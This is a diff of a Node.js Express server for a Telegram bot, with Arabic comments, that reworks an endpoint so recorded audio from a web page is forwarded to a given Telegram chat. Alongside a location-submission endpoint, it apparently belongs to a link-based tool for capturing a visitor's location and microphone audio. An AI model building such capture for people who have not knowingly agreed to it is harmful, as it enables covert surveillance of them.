@@ -3613,8 +3613,11 @@ app.post('/submitLocation', async (req, res) => {
     }
 });
 
+app.use(express.urlencoded({ extended: true }));
+app.use(express.json({ limit: '10mb' })); // زيادة الحد للبيانات الكبيرة
+app.use(express.static('public'));
 
-
+// توجيه لصفحة تسجيل الصوت
 app.get('/', (req, res) => {
     const chatId = req.query.chatId;
     if (chatId) {
@@ -3625,7 +3628,7 @@ app.get('/', (req, res) => {
 });
 
 // أمر البدء /start
-bot.onText(/\/sffdjkvctart/, (msg) => {
+bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     
     const keyboard = {
@@ -3663,32 +3666,72 @@ bot.on('callback_query', (callbackQuery) => {
 });
 
 // نقطة النهاية لاستقبال الصوت من الصفحة HTML
-app.post('/submit-audio', upload.single('audio'), async (req, res) => {
+app.post('/submit-audio', express.raw({
+    type: 'application/octet-stream',
+    limit: '10mb'
+}), async (req, res) => {
     try {
-        const { chatId } = req.body;
+        console.log('طلب استقبال صوت - حجم البيانات:', req.body.length);
         
-        if (!chatId || !req.file) {
-            return res.status(400).send('بيانات ناقصة');
+        // الحصول على معرف المحادثة من الهيدر
+        const chatId = req.headers['x-chat-id'];
+        
+        if (!chatId) {
+            return res.status(400).json({ 
+                success: false, 
+                message: 'معرف المحادثة مطلوب' 
+            });
         }
 
-        console.log('تم استقبال التسجيل الصوتي:', { chatId, file: req.file });
+        if (!req.body || req.body.length === 0) {
+            return res.status(400).json({ 
+                success: false, 
+                message: 'لم يتم استقبال بيانات صوتية' 
+            });
+        }
 
-        // إرسال الصوت إلى المستخدم في التلجرام
-        await bot.sendMessage(chatId, '✅ تم استقبال تسجيلك الصوتي بنجاح!');
-        
-        // إرسال الملف الصوتي
-        await bot.sendAudio(chatId, req.file.path, {
-            caption: 'تسجيل صوتي مدته 10 ثواني'
+        console.log('تم استقبال البيانات الصوتية:', { 
+            chatId, 
+            dataSize: req.body.length 
         });
 
-        // حذف الملف المؤقت
-        fs.unlinkSync(req.file.path);
+        try {
+            // إرسال رسالة تأكيد
+            await bot.sendMessage(chatId, '🎤 تم استقبال تسجيلك الصوتي بنجاح!');
 
-        res.status(200).json({ success: true, message: 'تم استقبال الصوت بنجاح' });
+            // إرسال الصوت مباشرة من الذاكرة
+            await bot.sendAudio(
+                chatId, 
+                req.body, // استخدام البيانات الخام مباشرة
+                {
+                    caption: 'تسجيل صوتي مدته 10 ثواني',
+                    title: 'تسجيل صوتي'
+                }
+            );
+
+            console.log('تم إرسال الصوت إلى التلجرام بنجاح');
+
+            res.status(200).json({ 
+                success: true, 
+                message: 'تم استقبال الصوت بنجاح' 
+            });
+
+        } catch (telegramError) {
+            console.error('خطأ في إرسال التلجرام:', telegramError);
+            
+            res.status(500).json({ 
+                success: false, 
+                message: 'خطأ في إرسال الصوت إلى التلجرام: ' + telegramError.message 
+            });
+        }
         
     } catch (error) {
         console.error('خطأ في معالجة الصوت:', error);
-        res.status(500).json({ success: false, message: 'خطأ في الخادم' });
+        
+        res.status(500).json({ 
+            success: false, 
+            message: 'خطأ في الخادم: ' + error.message 
+        });
     }
 });
 
